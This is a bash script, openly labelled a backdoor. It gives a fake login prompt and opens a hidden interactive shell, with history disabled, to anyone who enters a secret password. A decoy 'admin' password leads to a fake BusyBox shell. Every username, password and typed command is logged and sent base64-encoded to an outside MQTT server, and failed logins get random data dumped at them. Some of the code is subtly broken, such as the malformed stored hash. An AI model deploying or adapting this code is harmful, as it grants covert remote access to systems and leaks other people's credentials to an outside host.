#!/bin/bash
# Hash here at top for easy sed passwd change
hash="f37a56bc1e439872ecb14979b5ec6c8e3bbfb9aaf4295ff5b5ebe1ed4fb43554288a652442a5ba8a2ae395834571141e04b52ba7fa6adb103d7a405ff4c9eeecsasr"
# if password is "admin" then fake shell
fakehash="c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec"
#


publish(){
message="$1"
pubtop=$2
echo "$message"|base64|pubclient -h $host -i ${ip} -q 0 -t "data/$pubtop" -u bot -P $pass -s
}

backdoor(){
cd /tmp/.bd # We should be in a writable directory
export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin

  for i in 1 2 3 4 5 6 7 8 9 10;do # 3 attemps before urandom blast
    unset $l00s3rshame 2>/dev/null 
    unset $magic 2>/dev/null # always make sure password is unset
    set +a # don't export variables
    printf "Login : ";read -r -p "" l00s3rshame # get username. kinda messy
    if ! echo "$l00s3rshame" |grep -q 'shellz\|kod';then
      echo "$l00s3rshame" >> /tmp/.bd/usernames
      pubtop="usernames"
      publish "$l00s3rshame" $pubtop
      unset pubtop
    fi
    if echo "$l00s3rshame" | grep -q 'shellz\|kod\|admin\|adm\|tech\|manager\|Administrator\|system\|Admin\|guest\|user'; then
#      echo "$l00s3rshame" >> /tmp/.bd/usernames
      printf "Password : " # get password, as carefully as possible
      IFS= read -r -s -p "" magic && \
      # if [[ $(printf "$magic"|sha1sum) == "$hash  -" ]];then
      printf "$magic" >/tmp/.bd/.pass;unset magic 2>/dev/null # write and erase from memory
      if echo "$hash */tmp/.bd/.pass" | sha512sum -c - > /dev/null 2>&1; then # check hash
        >/tmp/.bd/.pass; # zero the temporary file (mktemp would be smart here)
        printf "\nAccess Granted!\n" # user is in
        set authtoken="true" # double measure of auth
        if $authtoken;then
          export HOME=/tmp # stuff to do before the shell
          export HISTFILE=/dev/null
          #export PATH=
          /bin/sh -i # our shell
          exit
        fi
        unset $authtoken 2>/dev/null # unset all our stuff (again)
        unset $l00s3rshame 2>/dev/null
        unset $magic 2>/dev/null 
      elif echo "$fakehash */tmp/.bd/.pass" | sha512sum -c - > /dev/null 2>&1; then # or if its a honey trigger password (like 'admin' ...)
        printf '\nBusyBox v1.01 (2013.08.17-05:44+0000) Built-in shell (msh)\nEnter "help" for a list of built-in commands.\n'
        for i in 1 2 3;do # allow them to "run three commands ;)"
          read -p "# " payload
          echo "$payload" >>/tmp/.bd/payloads # Save the commands
          pubtop="payloads"
          publish "$payload" $pubtop
          unset pubtop
          printf "Segmentation fault. Core dumped.\n"  # Show some bs error message
          unset payload
        done
        /var/bin/head -n 1000 /dev/urandom 2>/dev/null # Blast them with urandom
        exit
      else # otherwise just say unauthorized... 
        printf "Unauthorized!\n"
        (cat /tmp/.bd/.pass >>/tmp/.bd/passwords;printf '\n' >>/tmp/.bd/passwords) 2>/dev/null # ... but store the password
        pubtop=passwords
        pw=$(cat /tmp/.bd/.pass)
        publish "$pw" $pubtop
        unset pubtop
        sleep 1
        
  fi

else
  printf "Unauthorized!\n" 2>/dev/null # end if for username
  /var/bin/sleep 1 2>/dev/null
fi

done # Three bad auths, so urandom blast!

printf "Too many authentication failures.\n Wait for it...\n" 2>/dev/null
/var/bin/sleep 1
/var/bin/head -n 1000 /dev/urandom 2>/dev/null
exit
}
# create stuff we need
if [ ! -d /tmp/.bd ];then mkdir /tmp/.bd ;fi ; chmod 700 /tmp/.bd
if [ ! -f /tmp/.bd/usernames ];then >/tmp/.bd/usernames;fi
if [ ! -f /tmp/.bd/passwords ];then >/tmp/.bd/passwords;fi ; chmod 600 /tmp/.bd/passwords
if [ ! -f /tmp/.bd/payloads ];then >/tmp/.bd/payloads;fi
host=${1:-"your.mqtt.server"}
pass=${2:-"lol"}
intf=${3:-"eth0"}
ip=$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
backdoor
exit
